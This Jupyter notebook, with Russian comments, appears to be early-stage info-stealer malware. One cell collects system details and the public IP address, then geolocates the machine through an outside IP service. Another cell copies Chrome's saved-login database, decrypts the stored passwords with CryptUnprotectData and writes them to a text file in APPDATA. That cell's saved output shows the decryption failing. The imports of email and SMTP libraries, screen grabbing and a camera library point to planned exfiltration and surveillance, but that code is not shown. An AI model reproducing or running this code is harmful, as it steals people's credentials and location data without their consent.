{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "e1b2b01f",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "from Crypto.Hash import SHA512\n",
    "#from hashlib import sha512 as SHA512\n",
    "import sqlite3\n",
    "import win32crypt\n",
    "import email, ssl\n",
    "import shutil\n",
    "import requests\n",
    "import zipfile\n",
    "import getpass\n",
    "import ip2geotools\n",
    "import win32api\n",
    "import platform\n",
    "import tempfile\n",
    "import smtplib\n",
    "import time\n",
    "import cv2\n",
    "import sys\n",
    "from PIL import ImageGrab\n",
    "from email.mime.multipart import MIMEMultipart \n",
    "from email.mime.base import MIMEBase \n",
    "from email.message import Message\n",
    "from email.mime.multipart import MIMEBase\n",
    "from email.mime.text import MIMEText\n",
    "from email.utils import COMMASPACE, formatdate\n",
    "from email import encoders\n",
    "from Tools.demo.mcast import sender\n",
    "from ip2geotools.databases.noncommercial import DbIpCity\n",
    "from os.path import basename\n",
    "from smtplib import SMTP\n",
    "from email.header import Header\n",
    "from email.utils import parseaddr, formataddr\n",
    "from base64 import encodebytes\n",
    "import random"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "7e89d4db",
   "metadata": {},
   "outputs": [],
   "source": [
    "################################################################################\n",
    "#                              ВСЕ ДАННЫЕ И ЛОКАЦИЯ                            #\n",
    "################################################################################\n",
    "drives = str(win32api.GetLogicalDriveStrings())\n",
    "drives = str(drives.split('\\000')[:-1])\n",
    "response = DbIpCity.get(requests.get(\"https://ramziv.com/ip\").text, api_key='free')\n",
    "all_data = \"Time: \" + time.asctime() + '\\n' + \"Кодировка ФС: \" + sys.getfilesystemencoding() + '\\n' + \"Cpu: \" + platform.processor() + '\\n' + \"Система: \" + platform.system() + ' ' + platform.release() + '\\nIP: '+requests.get(\"https://ramziv.com/ip\").text+'\\nГород: '+response.city+'\\nGen_Location:' + response.to_json() + '\\nДиски:' + drives\n",
    "file = open(os.getenv(\"APPDATA\") + '\\\\alldata.txt', \"w+\") \n",
    "file.write(all_data)\n",
    "file.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "c69e27c9",
   "metadata": {},
   "outputs": [
    {
     "ename": "error",
     "evalue": "(87, 'CryptUnprotectData', 'Параметр задан неверно.')",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31merror\u001b[0m                                     Traceback (most recent call last)",
      "\u001b[1;32m~\\AppData\\Local\\Temp/ipykernel_3576/3268817207.py\u001b[0m in \u001b[0;36m<module>\u001b[1;34m\u001b[0m\n\u001b[0;32m     18\u001b[0m    \u001b[1;32mreturn\u001b[0m \u001b[0mtext\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m     19\u001b[0m \u001b[0mfile\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mopen\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mos\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mgetenv\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;34m\"APPDATA\"\u001b[0m\u001b[1;33m)\u001b[0m \u001b[1;33m+\u001b[0m \u001b[1;34m'\\\\google_pass.txt'\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;34m\"w+\"\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m---> 20\u001b[1;33m \u001b[0mfile\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mwrite\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mstr\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mChrome\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m)\u001b[0m \u001b[1;33m+\u001b[0m \u001b[1;34m'\\n'\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m     21\u001b[0m \u001b[0mfile\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mclose\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32m~\\AppData\\Local\\Temp/ipykernel_3576/3268817207.py\u001b[0m in \u001b[0;36mChrome\u001b[1;34m()\u001b[0m\n\u001b[0;32m     11\u001b[0m        \u001b[0mcursor\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mexecute\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;34m'SELECT action_url, username_value, password_value FROM logins'\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m     12\u001b[0m        \u001b[1;32mfor\u001b[0m \u001b[0mresult\u001b[0m \u001b[1;32min\u001b[0m \u001b[0mcursor\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mfetchall\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m---> 13\u001b[1;33m            \u001b[0mpassword\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mwin32crypt\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mCryptUnprotectData\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mresult\u001b[0m\u001b[1;33m[\u001b[0m\u001b[1;36m2\u001b[0m\u001b[1;33m]\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;32mNone\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;32mNone\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;32mNone\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;36m0\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m[\u001b[0m\u001b[1;36m1\u001b[0m\u001b[1;33m]\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mdecode\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m     14\u001b[0m            \u001b[0mlogin\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mresult\u001b[0m\u001b[1;33m[\u001b[0m\u001b[1;36m1\u001b[0m\u001b[1;33m]\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m     15\u001b[0m            \u001b[0murl\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mresult\u001b[0m\u001b[1;33m[\u001b[0m\u001b[1;36m0\u001b[0m\u001b[1;33m]\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;31merror\u001b[0m: (87, 'CryptUnprotectData', 'Параметр задан неверно.')"
     ]
    }
   ],
   "source": [
    "################################################################################\n",
    "#                              GOOGLE PASSWORDS                                #\n",
    "################################################################################\n",
    "def Chrome(): \n",
    "   text = 'Passwords Chrome:' + '\\n' \n",
    "   text += 'URL | LOGIN | PASSWORD' + '\\n' \n",
    "   if os.path.exists(os.getenv(\"LOCALAPPDATA\") + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data'): \n",
    "       shutil.copy2(os.getenv(\"LOCALAPPDATA\") + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data', os.getenv(\"LOCALAPPDATA\") + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data2')\n",
    "       conn = sqlite3.connect(os.getenv(\"LOCALAPPDATA\") + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data2') \n",
    "       cursor = conn.cursor()\n",
    "       cursor.execute('SELECT action_url, username_value, password_value FROM logins')\n",
    "       for result in cursor.fetchall():\n",
    "           password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1].decode() \n",
    "           login = result[1]\n",
    "           url = result[0]\n",
    "           if password != '':\n",
    "               text += url + ' | ' + login + ' | ' + password + '\\n' \n",
    "   return text\n",
    "file = open(os.getenv(\"APPDATA\") + '\\\\google_pass.txt', \"w+\")\n",
    "file.write(str(Chrome()) + '\\n')\n",
    "file.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a3c87ab3",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
